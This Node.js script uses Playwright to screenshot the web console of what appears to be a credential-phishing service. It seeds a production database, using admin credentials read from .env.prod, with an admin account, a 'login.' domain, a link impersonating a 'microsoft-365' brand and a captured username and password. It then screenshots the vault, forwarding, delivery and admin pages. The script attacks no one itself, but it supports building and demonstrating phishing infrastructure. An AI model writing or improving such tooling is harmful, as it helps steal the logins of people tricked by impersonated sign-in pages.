#!/usr/bin/env node
/**
 * Visual smoke: signs up a throwaway, seeds one live service with a domain and a
 * capture, then screenshots every console surface at desktop and mobile widths.
 * Usage: node scripts/shots.mjs [outDir]
 */
import { mkdirSync } from "node:fs";
import { readFileSync } from "node:fs";
import pg from "pg";
import { chromium } from "playwright";

const BASE = process.env.SHOTS_BASE ?? "https://app.mailerdeaon.bid";
const OUT =
  process.argv[2] ?? "C:/Users/Administrator/AppData/Local/Temp/2/opencode/shots";
const epoch = Date.now();
const email = `shots.${epoch}@mailinator.com`;
const password = "correct horse 42";

async function post(path, body) {
  const res = await fetch(BASE + path, {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams(body),
    redirect: "manual",
  });
  return res;
}

const signup = await post("/api/signup", {
  name: "Shots",
  orgName: "Northwind Cloud",
  email,
  password,
});
if (signup.status !== 303) throw new Error(`signup ${signup.status}`);
const cookie = (signup.headers.getSetCookie() ?? [])
  .map((line) => line.split(";")[0])
  .find((pair) => pair.includes("session_token"));
if (!cookie) throw new Error("no session cookie");

const created = await fetch(`${BASE}/api/services`, {
  method: "POST",
  headers: { cookie, "content-type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({ serviceType: "chameleon", tier: "pro" }),
  redirect: "manual",
});
const serviceId = (created.headers.get("location") ?? "").split("/").pop();
if (!serviceId) throw new Error("no service id");

const env = readFileSync(".env.prod", "utf8");
const dsn = env.match(/DATABASE_URL_ADMIN='([^']+)'/)?.[1];
const db = new pg.Client({ connectionString: dsn });
await db.connect();
const org = await db.query(
  "select org_id from memberships where user_id = (select id from users where email = $1)",
  [email],
);
const orgId = org.rows[0]?.org_id;
await db.query("update users set is_admin = true where email = $1", [email]);
await db.query(
  `update services set status = 'active', activated_at = now(), paid_until = now() + interval '30 days',
     expires_at = now() + interval '30 days', gate_mode = 'always', link_slots_used = 1, domain_slots_used = 1
   where id = $1`,
  [serviceId],
);
const domain = await db.query(
  "insert into domains (org_id, service_id, hostname, verify_token, status, verified_at, last_checked_at) values ($1, $2, 'login.' || $3, 'demo', 'active', now(), now()) returning id",
  [orgId, serviceId, `northwind-${epoch}.com`],
);
const link = await db.query(
  "insert into links (org_id, service_id, domain_id, slug, pinned_brand_id) values ($1, $2, $3, 'A7K2M', (select id from brands where slug = 'microsoft-365')) returning id",
  [orgId, serviceId, domain.rows[0].id],
);
await db.query(
  `insert into captures (id, org_id, service_id, link_id, kind, fields, source, received_at)
   values (gen_random_uuid(), $1, $2, $3, 'credential', $4, 'human', now() - interval '4 minutes')`,
  [
    orgId,
    serviceId,
    link.rows[0].id,
    JSON.stringify({ username: "j.mitchell@northwind", password: "Autumn!2026" }),
  ],
);
await db.end();

mkdirSync(OUT, { recursive: true });

const browser = await chromium.launch();
const shots = [
  ["/dashboard", "dashboard"],
  ["/services", "services"],
  [`/services/${serviceId}`, "service"],
  ["/vault", "vault"],
  ["/settings", "settings"],
  ["/settings/domains", "domains"],
  ["/settings/forwarding", "forwarding"],
  ["/settings/delivery", "delivery"],
  ["/account", "account"],
  ["/admin", "admin"],
  ["/admin/mail", "admin-mail"],
  ["/admin/audit", "admin-audit"],
  ["/", "landing"],
  ["/login", "login"],
];

for (const [size, label] of [
  [{ width: 1360, height: 950 }, "desktop"],
  [{ width: 390, height: 844 }, "mobile"],
]) {
  const context = await browser.newContext({ viewport: size });
  await context.addCookies([
    {
      name: cookie.split("=")[0],
      value: cookie.split("=").slice(1).join("="),
      url: BASE,
      secure: true,
      httpOnly: true,
    },
  ]);
  const page = await context.newPage();
  for (const [path, name] of shots) {
    if (path === "/" || path === "/login") {
      await context.clearCookies();
    } else {
      await context.addCookies([
        {
          name: cookie.split("=")[0],
          value: cookie.split("=").slice(1).join("="),
          url: BASE,
          secure: true,
          httpOnly: true,
        },
      ]);
    }
    const res = await page.goto(BASE + path, { waitUntil: "networkidle" });
    await page.screenshot({ path: `${OUT}/${label}-${name}.png`, fullPage: true });
    console.log(label, path, res?.status());
  }
  await context.close();
}
await browser.close();
console.log(JSON.stringify({ email, password, serviceId, out: OUT }));
